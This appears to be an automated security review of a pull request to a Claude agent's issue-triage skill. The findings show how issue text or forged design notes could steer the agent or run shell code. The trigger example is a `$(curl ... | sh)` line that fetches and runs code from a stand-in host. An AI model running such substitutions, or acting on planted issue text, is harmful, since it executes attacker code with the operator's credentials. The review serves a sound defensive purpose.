prior_importants.description: Step 4 tells the agent to reproduce a bug 'from the reporter's steps before recommending anything'. With `Write(*)` and `Bash(pnpm test*)` allowlisted, a reproduction field that supplies a test file gets written and executed without a permission prompt, with the operator's credentials.

The step-8 template wraps goals and criteria in double quotes. The brief's own criterion style uses backticks, which bash runs as command substitution, so pasting or running the offered command executes whatever the issue text puts in backticks.

findings.description: The step 8 quoting fix covers only `pup plan add`. Every comment the skill posts (needs-info, brief, design note, rejection, close) quotes issue text and markdown backticks, yet the skill never says how to post it. A double-quoted `--body "..."` or `gh issue close --comment "..."` runs backticks and `$(...)` from the issue on the operator's machine.
findings.body:
**Issue text can still reach the shell through the comments triage posts.**

The round-1 fix single-quotes the arguments to `pup plan add` (step 8). Comments are the larger channel, and they are still open:

- Line 17 tells the agent to quote issue text "when you reason about it".
- Step 7 (L39-45) posts that reasoning as a brief, a design note, a needs-info note, a rejection or a closing comment.
- The skill never says how to post a comment, so the agent falls back on the usual default: `gh issue comment <n> --body "..."` or `gh issue close <n> --comment "..."`.

Inside double quotes, bash still runs backticks and `$(...)`.

**Trigger:** an issue body says ``steps: run `$(curl -s https://x.example/p|sh)` then pup status``. The agent quotes it in its needs-info note, and the substitution runs on the operator's machine once the `gh issue comment` call is approved. The agent's own markdown is enough to trip this. AGENT-BRIEF's model criterion wraps `` `pup plan add` `` in backticks, so a brief posted with `--body "..."` runs `pup plan add`.

**Nothing else catches it:**
- `.claude/hooks/git-safety.sh` does not inspect `$(` or backticks.
- No repo-wide rule requires `--body-file`.
- `gh issue *` is not allowlisted, so the operator does get a prompt. But they would have to spot a substitution buried in a long markdown body, and auto mode shows no prompt at all.

The sibling skills already handle this, which makes triage the outlier:
- `to-tickets/SKILL.md:52`: "`gh issue comment <n> --body-file <file>` (a file outside the repo)".
- `wayfinder/SKILL.md:75`: "never splice text into the command line".

https://github.com/AlexisBalayre/pupitre/blob/0838adeed49ec5db8fce05eaff7e5beeb5ee348f/.claude/skills/triage/SKILL.md#L11-L17
findings.suggestion: Post every comment with `gh issue comment <n> --body-file <file>`, the file written outside the repo, never `--body "..."` or `gh issue close --comment "..."`: a comment quotes issue text and markdown backticks, and inside double quotes the shell runs backticks and `$(...)`. Every comment starts with this line, so a reader knows an agent wrote it:

findings.description: Step 1 trusts a note from a "write collaborator" by `authorAssociation` but never says which values count. An account marked `CONTRIBUTOR` (it once had a commit merged) could then post a forged triage note marking fields "established" and have it trusted. Name `OWNER` and `COLLABORATOR` explicitly.

Triage posts the design note as an issue comment, marked only by a header anyone can copy, then hands it to `/to-tickets`. That skill reads `gh issue view <n> --comments` with no author check, so a forged "## Design note" posted after `design-approved` can shape a planned task's scope. `/to-tickets` should take the note only from a trusted author.

process_issues.description: The checkout was at 6594f46d, but the PR head is 0838adee: the freshness check failed. `git show 0838adee:<path>` failed and `.claude-pr/` was absent. Reviewers and the validator read the head content from `gh pr diff 438` instead, so line numbers came from hunk headers.
`bash scripts/adr-index.sh` needed approval and did not run under CI. The reviewer read ADRs 176 and 187 directly by path instead.
